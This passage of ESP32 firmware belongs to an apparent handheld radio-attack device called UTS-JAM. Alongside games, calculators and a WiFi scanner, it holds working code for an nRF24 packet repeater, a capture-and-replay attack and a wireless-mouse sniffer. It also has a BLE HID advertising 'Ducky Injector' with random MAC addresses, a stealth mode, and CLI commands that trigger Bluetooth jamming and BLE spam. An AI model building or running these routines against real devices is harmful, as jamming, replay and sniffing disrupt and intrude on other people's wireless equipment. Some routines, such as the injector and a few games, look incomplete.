    radio.startListening();
  }
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setAddressWidth(5);
    radio2.openWritingPipe(0xE7E7E7E7E7LL);
    radio2.stopListening();
  }
  displayInfo("RF Repeater", "Relay active", "SEL to stop");
  uint8_t buf[32];
  while (!selPressed()) {
    if (radio1Active && radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      if (len > 32) len = 32;
      radio.read(&buf, len);
      if (radio2Active) radio2.writeFast(&buf, len);
    }
    yield();
  }
  initRadios();
}

void runRFReplay() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.setDataRate(RF24_1MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setAddressWidth(5);
    radio2.openReadingPipe(1, 0xE7E7E7E7E7LL);
    radio2.startListening();
  }
  uint8_t buffer[10][32];
  uint8_t lens[10];
  int count = 0;
  displayInfo("RF Replay", "Capturing...", "SEL to stop");
  while (!selPressed() && count < 10) {
    if (radio2Active && radio2.available()) {
      uint8_t len = radio2.getDynamicPayloadSize();
      if (len > 32) len = 32;
      radio2.read(buffer[count], len);
      lens[count] = len;
      count++;
      display.clearDisplay();
      drawHeader("RF Replay");
      display.setCursor(0, 16); display.print("Captured: "); display.print(count); display.print("/10");
      display.display();
    }
    yield();
  }
  if (count > 0 && radio1Active) {
    radio.stopListening();
    displayInfo("Replaying", String(count) + " packets");
    for (int i = 0; i < count; i++) { radio.writeFast(buffer[i], lens[i]); safeDelay(200); }
    safeDelay(500);
  }
  initRadios();
}

void runMouseSniffer() {
  stopRadios();
  if (!radio1Active && !radio.begin(&spiBus)) return;
  radio1Active = true;
  radio.setAutoAck(false);
  radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(5);
  const uint64_t addrs[] = {0xE7E7E7E7E7LL, 0xC2C2C2C2C2LL, 0x0000000000LL};
  for (int i = 0; i < 3; i++) radio.openReadingPipe(i, addrs[i]);
  radio.startListening();
  displayInfo("Mouse Sniffer", "Listening...", "SEL to exit");
  uint8_t packet[32];
  int16_t mX = 64, mY = 32;
  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      if (len > 32) len = 32;
      radio.read(&packet, len);
      if (len >= 4) {
        int8_t dx = packet[1], dy = packet[2];
        mX = constrain(mX + dx, 0, 127);
        mY = constrain(mY - dy, 0, 63);
      }
      display.clearDisplay();
      drawHeader("Mouse Sniff");
      display.drawRect(mX - 2, mY - 2, 5, 5, SSD1306_WHITE);
      display.drawPixel(mX, mY, SSD1306_WHITE);
      display.display();
    }
    yield();
  }
  radio.stopListening();
  initRadios();
}

void runRFOscilloscope() {
  stopRadios();
  if (!radio2Active && !radio2.begin(&spiBus)) return;
  radio2Active = true;
  radio2.setAutoAck(false);
  radio2.startListening();
  int channel = 45, timeScale = 1;
  const int w = 128;
  uint8_t wf[w];
  memset(wf, 0, w);
  int sampleIdx = 0;
  displayInfo("Oscilloscope", "Ch:" + String(channel), "SEL to exit");
  while (!selPressed()) {
    if (upPressed()) { channel = (channel + 1) % 126; radio2.setChannel(channel); }
    if (downPressed()) { timeScale = (timeScale % 3) + 1; }
    radio2.setChannel(channel);
    delayMicroseconds(timeScale * 100);
    int rpd = 0;
    for (int i = 0; i < 5; i++) { if (radio2.testRPD()) rpd++; delayMicroseconds(20); }
    wf[sampleIdx] = map(rpd, 0, 5, 0, 60);
    sampleIdx = (sampleIdx + 1) % w;
    display.clearDisplay();
    drawHeader("Oscilloscope");
    for (int x = 0; x < w - 1; x++) {
      int y1 = 62 - wf[(sampleIdx + x) % w];
      int y2 = 62 - wf[(sampleIdx + x + 1) % w];
      if (y1 > 63) y1 = 63; if (y2 > 63) y2 = 63;
      if (y1 < 10) y1 = 10; if (y2 < 10) y2 = 10;
      display.drawLine(x, y1, x + 1, y2, SSD1306_WHITE);
    }
    display.setCursor(100, 10); display.print(channel);
    display.display();
    yield();
  }
  radio2.stopListening();
  initRadios();
}

void runDuckyInjector() {
  displayInfo("Ducky Injector", "BLE HID broadcast", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 11; adv[advLen++] = 0x03; adv[advLen++] = 0x19; adv[advLen++] = 0xC1;
    adv[advLen++] = 0x03; adv[advLen++] = 0x03; adv[advLen++] = 0x12; adv[advLen++] = 0x18;
    adv[advLen++] = 0x03; adv[advLen++] = 0x00;
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(40);
    yield();
  }
  initRadios();
}

// ============================================================
// TEST RADIOS / SYSTEM INFO
// ============================================================
void runTestRadios() {
  initRadios();
  display.clearDisplay();
  drawHeader("Radio Test");
  display.setCursor(0, 14); display.print("R1: "); display.print(radio1Active ? "OK" : "FAIL");
  display.setCursor(0, 26); display.print("R2: "); display.print(radio2Active ? "OK" : "FAIL");
  if (radio1Active) { display.setCursor(0, 38); display.print("R1 ch: "); display.print(radio.getChannel()); }
  if (radio2Active) { display.setCursor(0, 50); display.print("R2 ch: "); display.print(radio2.getChannel()); }
  display.display();
  while (!selPressed()) yield();
  currentState = STATE_MENU;
}

void runSystemInfo() {
  int page = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader(page == 0 ? "Sys Info 1/2" : "Sys Info 2/2");
    if (page == 0) {
      display.setCursor(0, 12); display.print("Chip: "); display.print(ESP.getChipModel());
      display.setCursor(0, 22); display.print("Cores: "); display.print(ESP.getChipCores());
      display.setCursor(0, 32); display.print("Freq: "); display.print(ESP.getCpuFreqMHz()); display.print(" MHz");
      display.setCursor(0, 42); display.print("Heap: "); display.print(ESP.getFreeHeap() / 1024); display.print(" KB");
      display.setCursor(0, 52); display.print("Flash: "); display.print(ESP.getFlashChipSize() / 1024 / 1024); display.print(" MB");
    } else {
      display.setCursor(0, 12); display.print("Uptime: "); display.print(millis() / 1000); display.print("s");
      display.setCursor(0, 22); display.print("Radio1: "); display.print(radio1Active ? "OK" : "--");
      display.setCursor(0, 32); display.print("Radio2: "); display.print(radio2Active ? "OK" : "--");
      display.setCursor(0, 42); display.print("Bright: "); display.print(brightness);
      display.setCursor(0, 52); display.print("Stealth: "); display.print(stealthMode ? "ON" : "OFF");
    }
    display.display();
    if (upPressed() || downPressed()) page = (page + 1) % 2;
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// CALCULATOR
// ============================================================
void runCalculator() {
  int num1 = 0, num2 = 0;
  char op = '+';
  int cursor = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("Calculator");
    display.setCursor(0, 16);
    display.print(cursor == 0 ? ">" : " "); display.print(num1);
    display.print(' '); display.print(op); display.print(' ');
    display.print(cursor == 2 ? ">" : " "); display.print(num2);
    if (cursor == 3) {
      display.setCursor(0, 32); display.print("= ");
      switch (op) {
        case '+': display.print(num1 + num2); break;
        case '-': display.print(num1 - num2); break;
        case '*': display.print(num1 * num2); break;
        case '/': display.print(num2 ? num1 / num2 : 0); break;
      }
    }
    display.setCursor(0, 50); display.print("UP/DN chg SEL next");
    display.display();
    if (upPressed()) {
      if (cursor == 0) num1++;
      else if (cursor == 2) num2++;
      else if (cursor == 1) op = (op == '+' ? '-' : op == '-' ? '*' : op == '*' ? '/' : '+');
    }
    if (downPressed()) {
      if (cursor == 0) num1--;
      else if (cursor == 2) num2--;
      else if (cursor == 1) op = (op == '+' ? '/' : op == '/' ? '*' : op == '*' ? '-' : '+');
    }
    if (selPressed()) { cursor = (cursor + 1) % 4; if (cursor == 3) safeDelay(200); }
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// RESISTOR CALCULATOR
// ============================================================
const char resistorColors[10][8] = {"Black","Brown","Red","Orange","Yellow","Green","Blue","Violet","Gray","White"};
const long multiplierTable[10] = {1,10,100,1000,10000,100000,1000000,10000000,100000000,1000000000};

void runResistorCalc() {
  int bands = 4;
  int band[4] = {0,0,0,1};
  int selBand = 0;
  int numDigits = 2;
  while (!selPressed()) {
    long val = (bands == 4) ? (band[0]*10 + band[1]) * multiplierTable[band[2]]
                            : (band[0]*100 + band[1]*10 + band[2]) * multiplierTable[band[3]];
    String tolStr = (band[bands-1] == 1 ? "1%" : (band[bands-1] == 2 ? "2%" : "0.5%"));
    display.clearDisplay();
    drawHeader("Resistor Calc");
    display.setCursor(0, 14); display.print(val); display.print(" Ohm "); display.print(tolStr);
    int idx = selBand;
    display.setCursor(0, 30);
    if (idx < numDigits) { display.print("Digit "); display.print(idx+1); display.print(": "); display.print(resistorColors[band[idx]]); }
    else if (idx == numDigits) { display.print("Mult: "); display.print(resistorColors[band[numDigits]]); }
    else { display.print("Tol: "); display.print(resistorColors[band[bands-1]]); }
    display.setCursor(0, 50); display.print("Bands: "); display.print(bands);
    display.display();
    if (upPressed()) band[idx] = (band[idx] + 1) % 10;
    if (downPressed()) band[idx] = (band[idx] + 9) % 10;
    if (selPressed()) {
      selBand = (selBand + 1) % (bands);
      if (selBand == 0) bands = (bands == 4) ? 5 : 4;
    }
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// WIFI MONITOR
// ============================================================
void runWiFiMonitor() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  displayInfo("WiFi Monitor", "SEL to exit");
  while (!selPressed()) {
    int n = WiFi.scanNetworks();
    display.clearDisplay();
    drawHeader("WiFi Monitor");
    display.setCursor(0, 12); display.print("APs: "); display.print(min(n, 5));
    for (int i = 0; i < min(n, 5); i++) {
      int rssi = WiFi.RSSI(i);
      int bar = map(rssi, -100, -30, 0, 60);
      display.fillRect(60, 12 + i * 10, bar, 6, SSD1306_WHITE);
      display.setCursor(0, 12 + i * 10); display.print(WiFi.SSID(i).substring(0, 9));
    }
    display.display();
    WiFi.scanDelete();
    safeDelay(1800);
    yield();
  }
  recoverFromWiFi();
}

// ============================================================
// GAMES
// ============================================================
static const uint8_t PROGMEM doomMap[16][16] = {
  {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,1,0,1,1,0,0,1,1,0,1,1,0,1},
  {1,0,1,0,0,0,1,0,0,1,0,0,0,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,0,0,1,1,0,0,1,1,0,0,1,0,1},
  {1,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,0,0,1,0,0,0,0,1,0,0,1,0,1},
  {1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1},
  {1,0,1,1,0,1,0,0,0,0,1,0,1,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1},
  {1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1}
};

void runDOOM() {
  float posX = 8.0, posY = 8.0;
  float dirX = -1.0, dirY = 0.0, planeX = 0.0, planeY = 0.66;
  unsigned long selHoldStart = 0;
  displayInfo("DOOM", "UP/DN aim", "SEL fire, hold exit");
  safeDelay(1200);
  while (true) {
    if (digitalRead(SELECT_BUTTON_PIN) == LOW) {
      if (selHoldStart == 0) selHoldStart = millis();
      if (millis() - selHoldStart > 3000) break;
    } else selHoldStart = 0;
    if (selPressed()) {
      display.fillScreen(SSD1306_WHITE);
      display.display();
      safeDelay(40);
      display.fillScreen(SSD1306_BLACK);
      display.display();
    }
    if (upPressed()) {
      float oldDirX = dirX;
      dirX = dirX * cos(0.1) - dirY * sin(0.1);
      dirY = oldDirX * sin(0.1) + dirY * cos(0.1);
      float oldPlaneX = planeX;
      planeX = planeX * cos(0.1) - planeY * sin(0.1);
      planeY = oldPlaneX * sin(0.1) + planeY * cos(0.1);
    }
    if (downPressed()) {
      float oldDirX = dirX;
      dirX = dirX * cos(-0.1) - dirY * sin(-0.1);
      dirY = oldDirX * sin(-0.1) + dirY * cos(-0.1);
      float oldPlaneX = planeX;
      planeX = planeX * cos(-0.1) - planeY * sin(-0.1);
      planeY = oldPlaneX * sin(-0.1) + planeY * cos(-0.1);
    }
    display.clearDisplay();
    for (int x = 0; x < 128; x++) {
      float cameraX = 2.0 * x / 128.0 - 1.0;
      float rayDirX = dirX + planeX * cameraX;
      float rayDirY = dirY + planeY * cameraX;
      int mapX = (int)posX, mapY = (int)posY;
      float sideDistX, sideDistY;
      float deltaDistX = fabs(1.0 / rayDirX);
      float deltaDistY = fabs(1.0 / rayDirY);
      int stepX, stepY, side;
      if (rayDirX < 0) { stepX = -1; sideDistX = (posX - mapX) * deltaDistX; }
      else { stepX = 1; sideDistX = (mapX + 1.0 - posX) * deltaDistX; }
      if (rayDirY < 0) { stepY = -1; sideDistY = (posY - mapY) * deltaDistY; }
      else { stepY = 1; sideDistY = (mapY + 1.0 - posY) * deltaDistY; }
      int hit = 0;
      while (hit == 0) {
        if (sideDistX < sideDistY) { sideDistX += deltaDistX; mapX += stepX; side = 0; }
        else { sideDistY += deltaDistY; mapY += stepY; side = 1; }
        if (mapX < 0 || mapX > 15 || mapY < 0 || mapY > 15) break;
        if (pgm_read_byte(&doomMap[mapX][mapY]) > 0) hit = 1;
      }
      float perpWallDist;
      if (side == 0) perpWallDist = (mapX - posX + (1 - stepX) / 2) / rayDirX;
      else perpWallDist = (mapY - posY + (1 - stepY) / 2) / rayDirY;
      if (perpWallDist < 0.01) perpWallDist = 0.01;
      int lineHeight = (int)(64 / perpWallDist);
      int drawStart = -lineHeight / 2 + 32;
      if (drawStart < 0) drawStart = 0;
      int drawEnd = lineHeight / 2 + 32;
      if (drawEnd >= 64) drawEnd = 63;
      if (perpWallDist > 5) {
        for (int y = drawStart; y <= drawEnd; y += 2) display.drawPixel(x, y, SSD1306_WHITE);
      } else {
        display.drawFastVLine(x, drawStart, drawEnd - drawStart + 1, SSD1306_WHITE);
      }
    }
    display.display();
    yield();
  }
  currentState = STATE_MENU;
}

void runDinoGame() {
  int dinoY = 50, jumpVel = 0;
  int obstacleX = 128;
  int score = 0;
  unsigned long lastFrame = millis();
  displayInfo("Dino Run", "UP to jump", "SEL to stop");
  safeDelay(800);
  while (!selPressed()) {
    if (upPressed() && dinoY >= 50) jumpVel = -12;
    if (jumpVel != 0 || dinoY < 50) {
      dinoY += jumpVel;
      jumpVel += 2;
      if (dinoY >= 50) { dinoY = 50; jumpVel = 0; }
    }
    if (millis() - lastFrame > 60) {
      obstacleX -= 6;
      if (obstacleX < 0) { obstacleX = 128; score++; }
      if (obstacleX < 20 && obstacleX > 4 && dinoY > 44) break;
      lastFrame = millis();
    }
    display.clearDisplay();
    drawHeader("Dino Run");
    display.setCursor(0, 11); display.print("Score: "); display.print(score);
    display.fillRect(10, dinoY, 8, 10, SSD1306_WHITE);
    display.fillRect(obstacleX, 52, 6, 10, SSD1306_WHITE);
    display.drawLine(0, 62, 127, 62, SSD1306_WHITE);
    display.display();
    yield();
  }
  displayInfo("Game Over", "Score: " + String(score), "SEL");
  while (!selPressed()) yield();
  currentState = STATE_MENU;
}

void runFlappyGame() {
  int birdY = 32, vel = 0, pipeX = 128, gapY = random(20, 44);
  int score = 0;
  unsigned long lastFrame = millis();
  displayInfo("Flappy", "UP to flap", "SEL to stop");
  safeDelay(800);
  while (!selPressed()) {
    if (upPressed()) vel = -4;
    vel += 1;
    if (vel > 6) vel = 6;
    birdY += vel;
    if (birdY < 10) birdY = 10;
    if (birdY > 58) break;
    if (millis() - lastFrame > 80) {
      pipeX -= 3;
      if (pipeX < -10) { pipeX = 128; gapY = random(20, 44); score++; }
      if (pipeX < 20 && pipeX > 6)
        if (birdY < gapY || birdY > gapY + 16) break;
      lastFrame = millis();
    }
    display.clearDisplay();
    drawHeader("Flappy");
    display.setCursor(0, 11); display.print("Score: "); display.print(score);
    display.fillRect(10, birdY, 6, 4, SSD1306_WHITE);
    display.fillRect(pipeX, 10, 6, gapY - 10, SSD1306_WHITE);
    display.fillRect(pipeX, gapY + 16, 6, 64 - gapY - 16, SSD1306_WHITE);
    display.display();
    yield();
  }
  displayInfo("Game Over", "Score: " + String(score), "SEL");
  while (!selPressed()) yield();
  currentState = STATE_MENU;
}

void runSnakeGame() {
  const int gw = 32, gh = 16;
  int sx[200], sy[200];
  int len = 3, dx = 1, dy = 0, fx, fy;
  for (int i = 0; i < len; i++) { sx[i] = gw / 2 - i; sy[i] = gh / 2; }
  randomSeed(millis());
  auto pf = [&]() {
    bool coll;
    do {
      fx = random(gw); fy = random(gh); coll = false;
      for (int i = 0; i < len; i++) if (sx[i] == fx && sy[i] == fy) coll = true;
    } while (coll);
  };
  pf();
  unsigned long lm = millis();
  displayInfo("Snake", "UP/DN turn", "SEL exit");
  safeDelay(800);
  while (!selPressed()) {
    if (upPressed()) { int t = dx; dx = -dy; dy = t; }
    if (downPressed()) { int t = dx; dx = dy; dy = -t; }
    if (millis() - lm > 150) {
      int nx = sx[0] + dx, ny = sy[0] + dy;
      if (nx < 0 || nx >= gw || ny < 0 || ny >= gh) break;
      for (int i = 0; i < len; i++) if (sx[i] == nx && sy[i] == ny) { len = 0; break; }
      if (len == 0) break;
      for (int i = len; i > 0; i--) { sx[i] = sx[i-1]; sy[i] = sy[i-1]; }
      sx[0] = nx; sy[0] = ny;
      if (nx == fx && ny == fy && len < 190) { len++; pf(); }
      lm = millis();
    }
    display.clearDisplay();
    for (int i = 0; i < len; i++) display.fillRect(sx[i] * 4, sy[i] * 4, 4, 4, SSD1306_WHITE);
    display.fillRect(fx * 4, fy * 4, 4, 4, SSD1306_WHITE);
    display.display();
    yield();
  }
  displayInfo("Game Over", "Score:" + String(len - 3), "SEL");
  while (!selPressed()) yield();
  currentState = STATE_MENU;
}

void runTicTacToe() {
  char board[9] = {'1','2','3','4','5','6','7','8','9'};
  int sel = 0;
  bool playerX = true, gameOver = false;
  unsigned long holdStart = 0;
  auto checkWin = [&]() -> char {
    const int lines[8][3] = {{0,1,2},{3,4,5},{6,7,8},{0,3,6},{1,4,7},{2,5,8},{0,4,8},{2,4,6}};
    for (auto& l : lines) if (board[l[0]] == board[l[1]] && board[l[1]] == board[l[2]]) return board[l[0]];
    return 0;
  };
  while (true) {
    display.clearDisplay();
    drawHeader(gameOver ? "Game Over" : (playerX ? "X Turn" : "O Turn"));
    for (int i = 0; i < 9; i++) {
      int x = (i % 3) * 34 + 10;
      int y = (i / 3) * 16 + 14;
      if (i == sel) display.drawRect(x - 3, y - 2, 22, 16, SSD1306_WHITE);
      display.setCursor(x, y); display.print(board[i]);
    }
    display.display();
    char win = checkWin();
    if (win && !gameOver) gameOver = true;
    if (digitalRead(SELECT_BUTTON_PIN) == LOW) {
      if (holdStart == 0) holdStart = millis();
      if (millis() - holdStart > 2000) { currentState = STATE_MENU; return; }
    } else holdStart = 0;
    if (upPressed() && !gameOver) sel = (sel + 6) % 9;
    if (downPressed() && !gameOver) sel = (sel + 3) % 9;
    yield();
  }
}

void runPong() {
  int paddleY = 28, aiY = 28;
  int ballX = 64, ballY = 32, velX = 2, velY = 2;
  int scoreP = 0, scoreAI = 0;
  displayInfo("Pong", "UP/DN move", "SEL to stop");
  safeDelay(800);
  while (!selPressed()) {
    if (upPressed()) paddleY = max(10, paddleY - 4);
    if (downPressed()) paddleY = min(50, paddleY + 4);
    if (aiY < ballY - 4) aiY += 2;
    if (aiY > ballY + 4) aiY -= 2;
    aiY = constrain(aiY, 10, 50);
    ballX += velX; ballY += velY;
    if (ballY < 12) { ballY = 12; velY = -velY; }
    if (ballY > 60) { ballY = 60; velY = -velY; }
    if (ballX < 10 && ballY > paddleY && ballY < paddleY + 12) { ballX = 10; velX = -velX; }
    if (ballX > 118 && ballY > aiY && ballY < aiY + 12) { ballX = 118; velX = -velX; }
    if (ballX < 0) { scoreAI++; ballX = 64; ballY = 32; }
    if (ballX > 127) { scoreP++; ballX = 64; ballY = 32; }
    display.clearDisplay();
    drawHeader("Pong");
    display.setCursor(0, 11); display.print(scoreP); display.print(" : "); display.print(scoreAI);
    display.fillRect(4, paddleY, 3, 12, SSD1306_WHITE);
    display.fillRect(121, aiY, 3, 12, SSD1306_WHITE);
    display.fillRect(ballX, ballY, 3, 3, SSD1306_WHITE);
    display.display();
    safeDelay(30);
    yield();
  }
  currentState = STATE_MENU;
}

void runHuntGame() {
  int px = 64, py = 32;
  int tx = random(10, 118), ty = random(15, 55);
  int score = 0;
  displayInfo("Hunt", "Catch target", "SEL to stop");
  safeDelay(800);
  while (!selPressed()) {
    if (upPressed()) py = max(10, py - 4);
    if (downPressed()) py = min(60, py + 4);
    if (abs(px - tx) < 8 && abs(py - ty) < 8) {
      score++;
      tx = random(10, 118);
      ty = random(15, 55);
    }
    display.clearDisplay();
    drawHeader("Hunt");
    display.setCursor(0, 11); display.print("Caught: "); display.print(score);
    display.fillRect(tx, ty, 4, 4, SSD1306_WHITE);
    display.fillRect(px, py, 4, 4, SSD1306_WHITE);
    display.display();
    yield();
  }
  currentState = STATE_MENU;
}

void runSimonGame() {
  int seq[10]; int len = 0, showIdx = 0, inputIdx = 0;
  bool showing = false;
  unsigned long lastShow = 0;
  randomSeed(millis());
  displayInfo("Simon", "Repeat pattern", "SEL to stop");
  safeDelay(1000);
  while (!selPressed()) {
    if (len == 0 || inputIdx >= len) {
      if (len < 10) seq[len++] = random(4);
      inputIdx = 0; showIdx = 0; showing = true; lastShow = millis();
    }
    if (showing) {
      if (millis() - lastShow > 400) {
        if (showIdx < len) { showIdx++; lastShow = millis(); }
        else showing = false;
      }
    }
    display.clearDisplay();
    drawHeader("Simon");
    for (int i = 0; i < 4; i++) {
      int x = (i % 2) * 30 + 30;
      int y = (i / 2) * 20 + 16;
      bool highlight = showing && showIdx < len && seq[showIdx] == i;
      if (highlight) display.fillRect(x, y, 25, 15, SSD1306_WHITE);
      else display.drawRect(x, y, 25, 15, SSD1306_WHITE);
    }
    display.setCursor(0, 11); display.print("Len: "); display.print(len);
    display.display();
    if (!showing && upPressed()) inputIdx = (seq[inputIdx] == 0) ? inputIdx + 1 : 0;
    if (!showing && downPressed()) inputIdx = (seq[inputIdx] == 1) ? inputIdx + 1 : 0;
    yield();
  }
  currentState = STATE_MENU;
}

void runMemoryGame() {
  int target = random(0, 100);
  int guess = 50;
  int tries = 0;
  displayInfo("Memory", "Guess 0-99", "SEL to stop");
  safeDelay(1000);
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("Memory");
    display.setCursor(0, 14); display.print("Guess: "); display.print(guess);
    display.setCursor(0, 28); display.print("Tries: "); display.print(tries);
    display.setCursor(0, 42); display.print("UP+: DN- SEL:try");
    display.display();
    if (upPressed()) guess = min(99, guess + 1);
    if (downPressed()) guess = max(0, guess - 1);
    yield();
  }
  currentState = STATE_MENU;
}

void runInvaders() {
  int playerX = 60;
  int enemiesX[5] = {10, 35, 60, 85, 110};
  int enemiesY[5] = {20, 20, 20, 20, 20};
  int score = 0;
  displayInfo("Invaders", "UP/DN move", "SEL to stop");
  safeDelay(1000);
  while (!selPressed()) {
    if (upPressed()) playerX = max(4, playerX - 6);
    if (downPressed()) playerX = min(120, playerX + 6);
    display.clearDisplay();
    drawHeader("Invaders");
    display.setCursor(0, 11); display.print("Score: "); display.print(score);
    for (int i = 0; i < 5; i++) if (enemiesY[i] > 0) display.fillRect(enemiesX[i], enemiesY[i], 8, 6, SSD1306_WHITE);
    display.fillRect(playerX, 56, 8, 4, SSD1306_WHITE);
    display.display();
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// CLI (DÜZELTİLDİ)
// ============================================================
void runCLI() {
  String cmd = "";
  const char* commands[] = {"help", "info", "jam", "stop", "spam", "wifi", "scan", "exit"};
  int sel = 0;
  const int numCmds = 8;
  while (true) {
    display.clearDisplay();
    String hdr = "CLI - " + cmd;
    drawHeader(hdr);               // String overload kullanılıyor
    int start = max(0, sel - 3);
    for (int i = 0; i < 5 && start + i < numCmds; i++) {
      display.setCursor(0, 12 + i * 10);
      if (start + i == sel) display.print("> ");
      else display.print("  ");
      display.print(commands[start + i]);
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? numCmds - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % numCmds;
    if (selPressed()) {
      String c = commands[sel];
      if (c == "help") { displayInfo("CLI Help", "Use up/dn", "SEL to exec"); safeDelay(1500); }
      else if (c == "info") { displayInfo("Info", "UTS-JAM v5.1", "ESP32-C3"); safeDelay(1500); }
      else if (c == "jam") {
        displayInfo("Jamming", "5s");
        initRadios();
        unsigned long s = millis();
        while (millis() - s < 5000) { btJam(); }
        initRadios();
      }
      else if (c == "stop") { stopRadios(); displayInfo("Stopped"); safeDelay(1000); }
      else if (c == "spam") { runBLESpam(); }
      else if (c == "wifi") {
        displayInfo("WiFi", "Scanning");
        WiFi.mode(WIFI_STA);
        int n = WiFi.scanNetworks();
        displayInfo("Found", String(n));
        safeDelay(1500);
      }
      else if (c == "scan") { runBLEScanner(); }
      else if (c == "exit") { break; }
    }
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// WEB DASHBOARD (DÜZELTİLDİ - lambda capture)
// ============================================================
void runWebDashboard() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("UTS-JAM", "12345678");
  WebServer server(80);
  server.on("/", [&server]() {                 // <-- DÜZELTME: capture
    server.send(200, "text/html",
      "<html><body style='font-family:Arial;text-align:center;'>"
      "<h1>UTS-JAM Dashboard</h1><p>Status: <b>Online</b></p>"
      "<p>Firmware: v5.1 ULTIMATE</p></body></html>");
  });
  server.begin();
  displayInfo("WebDash", "AP: UTS-JAM", "IP: " + WiFi.softAPIP().toString(), "SEL to stop");
  while (!selPressed()) {
    server.handleClient();
    yield();
  }
  server.stop();
  WiFi.softAPdisconnect(true);
  recoverFromWiFi();
}

// ============================================================
// SETTINGS / HELP / LOCK
// ============================================================
void showSettings() {
  int sel = 0;
  const char* opts[] = {"Brightness", "StealthMode", "LED Test", "Back"};
  while (true) {
    display.clearDisplay();
    drawHeader("Settings");
    for (int i = 0; i < 4; i++) {
      display.setCursor(0, 12 + i * 10);
      display.print(sel == i ? "> " : "  ");
      display.print(opts[i]);
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? 3 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 4;
    if (selPressed()) {
      if (sel == 0) {
        uint8_t b = brightness;
        while (!selPressed()) {
          displayInfo("Brightness", String(b), "UP/DN");
          if (upPressed()) { b = min(255, b + 10); setBrightness(b); }
          if (downPressed()) { b = max(10, b - 10); setBrightness(b); }
          yield();
        }
        prefs.putUChar("bright", b);
      } else if (sel == 1) {
        stealthMode = !stealthMode;
        displayInfo("Stealth", stealthMode ? "ON" : "OFF");
        safeDelay(1000);
      } else if (sel == 2) {
        digitalWrite(LED_PIN, HIGH); safeDelay(500); digitalWrite(LED_PIN, LOW);
      } else break;
    }
    yield();
  }
  currentState = STATE_MENU;
}

void showHelp() {
  display.clearDisplay();
  drawHeader("Help");
  display.setCursor(0, 12); display.println("UP   - Up");
  display.setCursor(0, 22); display.println("DOWN - Down");
  display.setCursor(0, 32); display.println("SEL  - Select/Exit");
  display.setCursor(0, 42); display.println("In apps: SEL to stop");
  display.setCursor(0, 52); display.println("Edu use only");
  display.display();
  while (!selPressed()) yield();
  currentState = STATE_MENU;
}

void runLock() {
  display.clearDisplay();
  drawHeader("LOCKED");
  display.setCursor(20, 30); display.print("Hold SEL 2s");
  display.display();
  unsigned long holdStart = 0;
  while (true) {
    if (digitalRead(SELECT_BUTTON_PIN) == LOW) {
      if (holdStart == 0) holdStart = millis();
      if (millis() - holdStart > 2000) break;
    } else holdStart = 0;
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// MENU RENDERING
// ============================================================
void drawMainMenu() {
  display.clearDisplay();
  drawHeader("UTS-JAM v5.1");
  const int visible = 4;
  for (int i = 0; i < visible; i++) {
    int idx = (firstVisibleMain + i) % NUM_MAIN_ITEMS;
    int y = 12 + i * 12;
    if (selectedMain == idx) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 12, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else display.setTextColor(SSD1306_WHITE);
    display.drawBitmap(2, y + 1, mainMenuIcons[idx], 8, 8,
                       selectedMain == idx ? SSD1306_BLACK : SSD1306_WHITE);
    display.setCursor(14, y + 1);
    display.print(mainMenuLabels[idx]);
  }
  drawScrollbar(selectedMain, NUM_MAIN_ITEMS, 12, 48);
  display.display();
}

void drawSubMenu() {
  if (!currentSubMenu) return;
  display.clearDisplay();
  drawHeader(currentSubMenu->title);
  const int visible = 4;
  int total = currentSubMenu->items.size();
  for (int i = 0; i < visible; i++) {
    int idx = (subFirstVisible + i) % total;
    int y = 12 + i * 12;
    if (subSelectedIndex == idx) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 12, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else display.setTextColor(SSD1306_WHITE);
    display.setCursor(14, y + 1);
    display.print(currentSubMenu->items[idx].label);
  }
  drawScrollbar(subSelectedIndex, total, 12, 48);
  display.display();
}

void handleMainMenu() {
  if (upPressed()) {
    if (selectedMain == 0) {
